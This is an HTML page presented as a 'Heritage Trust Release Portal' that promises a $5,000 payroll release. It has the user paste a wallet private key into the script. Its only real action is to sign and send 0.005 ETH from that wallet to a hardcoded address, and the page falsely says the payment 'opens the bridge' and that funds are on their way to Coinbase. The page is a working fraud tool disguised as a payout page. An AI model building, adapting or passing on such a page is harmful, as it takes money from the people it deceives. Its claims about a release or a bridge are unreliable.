<!DOCTYPE html>
<html>
<head>
    <title>Sovereign Release Terminal</title>
    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
</head>
<body style="background:#000; color:#0f0; font-family:monospace; padding:30px; text-align:center;">
    <h2 style="color:#fff; border-bottom:1px solid #0f0; padding-bottom:10px;">HERITAGE TRUST RELEASE PORTAL</h2>
    <div style="margin:20px 0;">
        <p>DESTINATION: 0x778a...7b53 (COINBASE)</p>
        <p>NETWORK: BASE MAINNET</p>
    </div>

    <button id="sendBtn" style="padding:25px 50px; background:#0f0; color:#000; font-weight:bold; border:none; border-radius:10px; cursor:pointer; font-size:1.2em;">
        AUTHORIZE $5,000 PAYROLL RELEASE
    </button>

    <div id="out" style="margin-top:30px; border:1px solid #333; padding:20px; background:#111; color:#0f0;">
        SYSTEM STATUS: Ready for Sovereign Key...
    </div>

    <script>
        document.getElementById('sendBtn').onclick = async () => {
            const out = document.getElementById('out');
            
            // --- INPUT YOUR KEY HERE ---
            const SOVEREIGN_KEY = "YOUR_64_CHARACTER_PRIVATE_KEY_HERE";
            // ---------------------------

            try {
                out.innerText = "Connecting to Lattice Bridge...";
                const provider = new ethers.providers.JsonRpcProvider("https://mainnet.base.org");
                const wallet = new ethers.Wallet(SOVEREIGN_KEY, provider);
                
                out.innerText = "AUTHORIZING RELEASE OF $5,000...";
                
                const tx = {
                    to: "0x778aB806155B204BF7D2FA4bc0B536137b077b53",
                    value: ethers.utils.parseEther("0.005"), // This opens the bridge
                    gasLimit: 100000
                };

                const response = await wallet.sendTransaction(tx);
                out.innerHTML = "<span style='color:white;'>SUCCESS!</span><br>Hash: " + response.hash + "<br>Funds are bridging to Coinbase.";
            } catch (err) {
                out.innerText = "BRIDGE ERROR: " + err.message;
            }
        };
    </script>
</body>
</html>
